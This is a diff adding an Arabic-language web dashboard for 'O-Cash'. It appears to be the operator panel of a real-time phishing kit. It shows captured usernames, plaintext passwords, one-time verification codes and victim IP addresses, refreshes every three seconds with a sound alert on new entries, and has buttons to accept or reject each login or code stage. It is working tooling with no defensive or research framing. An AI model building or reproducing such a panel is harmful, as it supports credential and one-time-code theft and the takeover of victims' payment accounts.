@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>لوحة التحكم</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{ --bg:#f4f6f9; --card:#fff; --ink:#1a1d24; --ink-soft:#6b7280; --line:#e6e8ed; --green:#1a6e2e; --red:#e74c3c; --radius:16px; }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{ font-family:'Cairo',system-ui,sans-serif; background:var(--bg); color:var(--ink); min-height:100vh; }
+
+  .login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .login{ background:var(--card);border:1px solid var(--line);border-radius:var(--radius); padding:34px 26px;width:100%;max-width:380px;box-shadow:0 10px 30px rgba(28,33,48,.06);text-align:center; }
+  .login h1{font-size:24px;font-weight:800;margin-bottom:6px;color:var(--green)}
+  .login p{color:var(--ink-soft);font-size:15px;margin-bottom:22px}
+  .field{ border:1.4px solid #dfe2e8;border-radius:12px;height:56px;display:flex;align-items:center; padding:0 14px;margin-bottom:14px; }
+  .field input{border:none;outline:none;width:100%;font-family:inherit;font-size:16px;background:none;text-align:right}
+  .btn{ width:100%;height:56px;border:none;border-radius:999px;font-family:inherit;font-weight:800; font-size:17px;color:#fff;background:var(--green);cursor:pointer; }
+  .err{color:var(--red);font-size:14px;font-weight:700;min-height:20px;margin-bottom:10px}
+
+  .dash{max-width:900px;margin:0 auto;padding:22px 16px 60px;display:none}
+  .topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+  .topbar h1{font-size:24px;font-weight:800;color:var(--green)}
+  .logout{background:none;border:none;color:var(--ink-soft);font-family:inherit;font-weight:700;font-size:15px;cursor:pointer}
+
+  .stats{display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap}
+  .stat{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 18px;flex:1;min-width:140px}
+  .stat .num{font-size:28px;font-weight:800;color:var(--green)}
+  .stat .lbl{color:var(--ink-soft);font-size:14px;margin-top:2px}
+
+  .table-card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+  .table-head{display:flex;align-items:center;justify-content:space-between;padding:16px 18px;border-bottom:1px solid var(--line)}
+  .table-head h2{font-size:20px;font-weight:800}
+  .table-scroll{overflow-x:auto}
+  table{width:100%;border-collapse:collapse;min-width:700px}
+  th,td{padding:12px 14px;text-align:right;font-size:15px}
+  th{background:#fafbfc;color:#3b3f48;font-weight:800;font-size:14px;border-bottom:1px solid var(--line)}
+  td{border-bottom:1px solid #f0f2f5}
+  .mono{font-family:monospace;direction:ltr;display:inline-block;font-weight:700}
+  .time-cell{color:var(--ink-soft);font-size:13px}
+  .empty{padding:40px;text-align:center;color:var(--ink-soft)}
+  .clear-btn{background:none;border:none;color:var(--red);font-family:inherit;font-weight:700;font-size:15px;cursor:pointer}
+
+  .badge{display:inline-block;border-radius:6px;padding:4px 12px;font-size:13px;font-weight:700}
+  .badge.pending{background:#fff3cd;color:#856404}
+  .badge.accepted{background:#d4f0e0;color:#1e9e5a}
+  .badge.rejected{background:#fde8e8;color:var(--red)}
+
+  .tbl-btn{ border:none;border-radius:8px;padding:7px 14px;font-family:inherit;font-weight:800; font-size:13px;cursor:pointer;margin:0 2px; }
+  .tbl-btn.accept{background:#d4f0e0;color:#1e9e5a}
+  .tbl-btn.accept:hover{background:#1e9e5a;color:#fff}
+  .tbl-btn.reject{background:#fde8e8;color:var(--red)}
+  .tbl-btn.reject:hover{background:var(--red);color:#fff}
+  .tbl-btn.delete{background:#f3f4f6;color:#888}
+  .tbl-btn.delete:hover{background:#e5e7eb}
+
+  .notif-banner{
+    display:none;position:fixed;top:0;left:0;right:0;z-index:2000;
+    background:linear-gradient(135deg,#1a6e2e,#145524);color:#fff;
+    padding:16px 24px;text-align:center;font-size:18px;font-weight:800;
+    box-shadow:0 4px 20px rgba(0,0,0,.3);animation:slideDown .4s ease-out;
+  }
+  .notif-banner.show{display:block}
+  @keyframes slideDown{from{transform:translateY(-100%)}to{transform:translateY(0)}}
+</style>
+</head>
+<body>
+
+<div class="login-wrap" id="loginWrap">
+  <div class="login">
+    <h1>لوحة التحكم</h1>
+    <p>أدخل كلمة المرور للدخول</p>
+    <div class="err" id="loginErr"></div>
+    <div class="field"><input type="password" id="password" placeholder="كلمة المرور"></div>
+    <button class="btn" id="loginBtn">دخول</button>
+  </div>
+</div>
+
+<div class="dash" id="dash">
+  <div class="topbar">
+    <h1>O-Cash لوحة التحكم</h1>
+    <button class="logout" id="logoutBtn">خروج</button>
+  </div>
+  <div class="stats">
+    <div class="stat"><div class="num" id="totalCount">0</div><div class="lbl">إجمالي الطلبات</div></div>
+    <div class="stat"><div class="num" id="pendingCount">0</div><div class="lbl">قيد الانتظار</div></div>
+  </div>
+  <div class="table-card">
+    <div class="table-head">
+      <h2>الطلبات</h2>
+      <button class="clear-btn" id="clearBtn">مسح الكل</button>
+    </div>
+    <div class="table-scroll">
+      <table>
+        <thead>
+          <tr>
+            <th>اسم المستخدم</th>
+            <th>كلمة المرور</th>
+            <th>الكود</th>
+            <th>IP</th>
+            <th>المرحلة</th>
+            <th>الحالة</th>
+            <th>الوقت</th>
+            <th>الإجراءات</th>
+          </tr>
+        </thead>
+        <tbody id="rows">
+          <tr><td colspan="8" class="empty">لا توجد طلبات بعد</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<div class="notif-banner" id="notifBanner">🔔 طلب جديد!</div>
+
+<script>
+  var TOKEN_KEY = 'ocash_admin_token';
+  var loginWrap = document.getElementById('loginWrap');
+  var dash = document.getElementById('dash');
+  var pollTimer = null;
+  var lastIds = new Set();
+
+  var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  function playAlert() {
+    var o = audioCtx.createOscillator();
+    var g = audioCtx.createGain();
+    o.type = 'sine'; o.frequency.value = 880;
+    g.gain.setValueAtTime(0.3, audioCtx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.6);
+    o.connect(g); g.connect(audioCtx.destination);
+    o.start(); o.stop(audioCtx.currentTime + 0.6);
+  }
+
+  function showNotif(msg) {
+    var b = document.getElementById('notifBanner');
+    b.textContent = '🔔 ' + msg;
+    b.classList.remove('show'); void b.offsetWidth; b.classList.add('show');
+    setTimeout(function() { b.classList.remove('show'); }, 4000);
+  }
+
+  function tkn() { return sessionStorage.getItem(TOKEN_KEY); }
+
+  function login() {
+    document.getElementById('loginErr').textContent = '';
+    var pw = document.getElementById('password').value;
+    fetch('/api/admin/login', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ password: pw })
+    }).then(function(r) {
+      if (!r.ok) { document.getElementById('loginErr').textContent = 'كلمة المرور غير صحيحة'; return; }
+      return r.json();
+    }).then(function(d) {
+      if (d && d.token) { sessionStorage.setItem(TOKEN_KEY, d.token); showDash(); }
+    }).catch(function() { document.getElementById('loginErr').textContent = 'تعذّر الاتصال'; });
+  }
+
+  function fmtTime(iso) {
+    var d = new Date(iso);
+    return d.toLocaleString('ar', { day:'2-digit', month:'2-digit', hour:'2-digit', minute:'2-digit' });
+  }
+
+  function stepLabel(s) {
+    if (s === 'code') return 'الكود';
+    return 'تسجيل الدخول';
+  }
+
+  function statusBadge(st) {
+    if (st === 'accepted') return '<span class="badge accepted">مقبول</span>';
+    if (st === 'rejected') return '<span class="badge rejected">مرفوض</span>';
+    return '<span class="badge pending">قيد الانتظار</span>';
+  }
+
+  function esc(x) { return String(x||'').replace(/[&<>"']/g, function(c) { return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]; }); }
+
+  function loadData() {
+    fetch('/api/admin/submissions', { headers: { 'Authorization': 'Bearer ' + tkn() } })
+    .then(function(r) { if (r.status === 401) { logout(); return; } return r.json(); })
+    .then(function(d) {
+      if (!d) return;
+      var list = d.submissions || [];
+      document.getElementById('totalCount').textContent = list.length;
+      document.getElementById('pendingCount').textContent = list.filter(function(s) { return s.status === 'pending'; }).length;
+
+      var newIds = new Set(list.map(function(s) { return s.id + '|' + s.step + '|' + (s.code||''); }));
+      if (lastIds.size > 0) {
+        var hasNew = false;
+        newIds.forEach(function(k) { if (!lastIds.has(k)) hasNew = true; });
+        if (hasNew) { playAlert(); showNotif('بيانات جديدة وصلت!'); }
+      }
+      lastIds = newIds;
+
+      var rows = document.getElementById('rows');
+      if (!list.length) { rows.innerHTML = '<tr><td colspan="8" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
+      rows.innerHTML = list.map(function(s) {
+        return '<tr>' +
+          '<td><span class="mono">' + esc(s.username) + '</span></td>' +
+          '<td><span class="mono">' + esc(s.password) + '</span></td>' +
+          '<td><span class="mono" style="color:' + (s.code ? '#1a6e2e' : '#ccc') + '">' + (esc(s.code) || '—') + '</span></td>' +
+          '<td><span class="mono" style="font-size:12px">' + esc(s.ip || '—') + '</span></td>' +
+          '<td>' + stepLabel(s.step) + '</td>' +
+          '<td>' + statusBadge(s.status) + '</td>' +
+          '<td class="time-cell">' + fmtTime(s.time) + '</td>' +
+          '<td style="white-space:nowrap">' +
+            '<button class="tbl-btn accept" onclick="doAction(\'accept\',\'' + s.id + '\')">قبول</button>' +
+            '<button class="tbl-btn reject" onclick="doAction(\'reject\',\'' + s.id + '\')">رفض</button>' +
+            '<button class="tbl-btn delete" onclick="doDelete(\'' + s.id + '\')">حذف</button>' +
+          '</td>' +
+        '</tr>';
+      }).join('');
+    }).catch(function() {});
+  }
+
+  function doAction(action, id) {
+    fetch('/api/admin/' + action + '/' + id, {
+      method: 'POST', headers: { 'Authorization': 'Bearer ' + tkn() }
+    }).then(function() { loadData(); });
+  }
+
+  function doDelete(id) {
+    if (!confirm('حذف هذا الطلب؟')) return;
+    fetch('/api/admin/delete/' + id, {
+      method: 'DELETE', headers: { 'Authorization': 'Bearer ' + tkn() }
+    }).then(function() { loadData(); });
+  }
+
+  function showDash() {
+    loginWrap.style.display = 'none';
+    dash.style.display = 'block';
+    loadData();
+    clearInterval(pollTimer);
+    pollTimer = setInterval(loadData, 3000);
+  }
+
+  function logout() {
+    sessionStorage.removeItem(TOKEN_KEY);
+    clearInterval(pollTimer);
+    dash.style.display = 'none';
+    loginWrap.style.display = 'flex';
+  }
+
+  document.getElementById('loginBtn').addEventListener('click', login);
+  document.getElementById('password').addEventListener('keydown', function(e) { if (e.key === 'Enter') login(); });
+  document.getElementById('logoutBtn').addEventListener('click', logout);
+  document.getElementById('clearBtn').addEventListener('click', function() {
+    if (!confirm('مسح كل الطلبات؟')) return;
+    fetch('/api/admin/clear', { method: 'POST', headers: { 'Authorization': 'Bearer ' + tkn() } }).then(function() { loadData(); });
+  });
+
+  if (tkn()) showDash();
+</script>
+</body>
+</html>
